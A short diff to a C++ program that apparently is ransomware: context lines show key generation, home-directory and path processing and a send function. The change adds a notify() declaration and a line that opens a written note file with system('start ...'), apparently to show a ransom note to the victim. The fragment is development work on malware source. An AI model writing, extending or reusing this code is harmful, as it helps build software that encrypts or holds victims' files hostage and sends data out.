@@ -24,6 +24,7 @@ void process(const path& path);
 string get_username();
 string get_home();
 void send();
+void notify();
 
 int main(int argc, char* argv[]) {
 	crypt_data* d = generatekey();
@@ -177,6 +178,8 @@ void notify() {
 		std::ofstream ofile(NOTIFY_FILENAME);
 		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
 		ofile.close();
+
+		system((string("start ") + NOTIFY_FILENAME).c_str());
 	}
 }
 
